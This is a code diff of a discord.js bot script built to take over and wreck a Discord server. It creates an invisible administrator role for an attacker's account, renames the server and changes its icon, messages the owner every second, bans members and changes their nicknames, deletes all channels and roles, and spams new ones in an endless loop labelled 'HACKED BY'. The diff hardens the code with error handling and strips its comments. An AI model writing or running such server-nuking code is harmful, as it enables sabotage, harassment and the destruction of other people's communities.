@@ -2,25 +2,24 @@ const Discord = require("discord.js")
 const client = new Discord.Client()
 const token = "BOT_TOKEN"
 
-// Will make you admin (NOT OWNER) in the targer server
 const setAdmin = (guildID, accountID) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
-    // Create an invisible role with an invisible char '\u200b' and the background color as role color
+
     targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {
-        // Add role to te account
+
         targetServer.members.get(accountID).addRole(role).catch((err) => {
            return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
         })
     })
 }
  
-// Will change name and icon of the server and send a DM to the owner
 const changeServerInfo = (guildID, options) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
+    
     targetServer.setName(options.newServerName)
     targetServer.setIcon(options.newServerIcon)
 
@@ -31,69 +30,72 @@ const changeServerInfo = (guildID, options) => {
     .setFooter(client.user.tag, client.user.avatarURL)
     .setColor("#ff0000")
 
-    // .sendEmbed() id deprecated method
     setInterval(() => {
     return targetServer.owner.send(embed)
     }, 1000)
 }
 
-// Will ban all members in the server
 const banMembers = (guildID) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
-    targetServer.members.forEach((member) => {
-        if (member.bannable) member.ban({reason: `HACKED BY ${client.user.tag}`})
+    targetServer.members.forEach(async (member) => {
+        member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
     })
 }
 
-// Will change nickname of each member
 const changeNicks = (guildID, newNick) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
     targetServer.members.forEach((member) => {
-        if (member.manageable) member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
+        try {
+            
+            member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
+        } catch (error) {
+            undefined
+        }
     })
 }
 
-// Wreate differents channels and add an admin role to all members to make a chaotic server
 const createChanelsAndRoles = (guildID, name) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
-  targetServer.members.forEach(users => {
-  		users.roles.forEach(ro => {
-  			users.removeRole(ro)
+    targetServer.members.forEach((member) => {
+  		member.roles.forEach(async (role) => {
+            try {
+                await member.removeRole(role)
+                  
+            } catch (error) {
+                undefined
+            }
   		})
-  })
-   targetServer.channels.forEach(ch => {
-    ch.delete()
-   })
-targetServer.roles.forEach(roless => {
-	roless.delete()
-})
-   setTimeout(() => {
-       
-   let i;
-    for(i=0; i < 50; i++) {
-   targetServer.createChannel(name, "text")
-    targetServer.createChannel(name, "text")
-    targetServer.createRole({name: name, permissions: [], color: "#40011c" }).then((hackedrole) =>{
-    	targetServer.members.forEach( allmembers=> {
-    		allmembers.addRole(hackedrole)
-    	})
-     })
-    }
-    }, 2000);
-
-    targetServer.createRole({name: name, permissions: "ADMINISTRATOR", color: 0xFF0000 }).then((role) => {
-        targetServer.members.forEach((member) => {
-            member.addRole(role, `HACKED BY ${client.user.tag}`)
-        })
     })
+
+    targetServer.channels.forEach(async (channel) => {
+        channel.deletable ? await channel.delete() : undefined
+    })
+
+    targetServer.roles.forEach(async(role) => {
+        role.deletable ? await role.delete() : undefined
+    })
+
+    setInterval(async () => {
+        await targetServer.createChannel(name, "text")
+        await targetServer.createChannel(name, "voice")
+        await targetServer.createRole({name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
+            await targetServer.members.forEach(async (member) => {
+                try {
+                    await member.addRole(role)
+                } catch (error) {
+                    undefined
+                }
+            })
+        })
+    }, 500)
 
 }
 
@@ -117,7 +119,7 @@ client.on("ready", () => {
     setAdmin(configs.targetServerID, configs.accountID)
     changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
     changeNicks(configs.targetServerID, configs.botNickname)
-    banMembers(configs.targetServerID)
+    // banMembers(configs.targetServerID)
     createChanelsAndRoles(configs.targetServerID, configs.botNickname)
 })
 
